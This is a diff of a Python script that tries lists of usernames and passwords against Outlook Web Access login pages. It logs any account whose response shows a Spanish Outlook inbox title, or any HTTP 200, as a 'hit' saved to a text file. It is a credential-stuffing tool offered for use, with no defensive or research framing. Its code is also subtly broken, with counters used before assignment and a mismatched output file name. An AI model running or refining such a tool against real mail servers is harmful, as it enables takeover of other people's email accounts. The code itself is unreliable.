@@ -1,9 +1,7 @@
 
 import requests
-from bs4 import BeautifulSoup as bs
 import csv 
 import re 
-import time
 #latest1
 
 
@@ -15,9 +13,14 @@ def sendreq(url,values):
     response = requests.post(url, data=values)
     status=response.status_code
     print(status)
-    open('owa3.html', 'wb').write(response.content)
     kuntent=response.text
     if "<title>Bandeja de entrada - Outlook</title>" in kuntent:
+        print("Success")
+        hit=hit+1
+        omk='{}|{}|{}'.format(y,user,pas)
+        print(omk)
+        open('hit.txt', 'w').write(omk)
+    elif status==200:
         print("Success")
         hit=hit+1
         omk='{}|{}|{}'.format(y,user,pas)
@@ -28,7 +31,9 @@ def sendreq(url,values):
     elif "<title>Outlook</title>" in kuntent:
         print("Fail,something is wrong ")
         fail=fail+1
-    return status
+    else:
+        fail=fail+1  
+    return status,hit,fail
 
 
 
@@ -39,13 +44,11 @@ with open('values.csv', newline='') as csvf:
         y= rd[0]
         user=rd[1]
         pas=rd[2]
-        print(rd[1])
         patt = r".*auth"
         mwe = re.findall(patt,y)
         for matches in mwe :
             matchesnew= matches+'.owa'
             matchesold= matches.replace('/auth', '')
-            print(matchesnew)
             url = matchesnew
             values = {'destination': matchesold,
                       'flags' : '4',
@@ -54,15 +57,10 @@ with open('values.csv', newline='') as csvf:
                       'password': pas,
                       'passwordText': '',
                       'isUtf8': '1',}
-            rk=sendreq(url,values)
-            
-                
+            rk=sendreq(url,values)  
             
 
-            
-            
-
-
+print("hits saved in hits.txt")
             
 
 
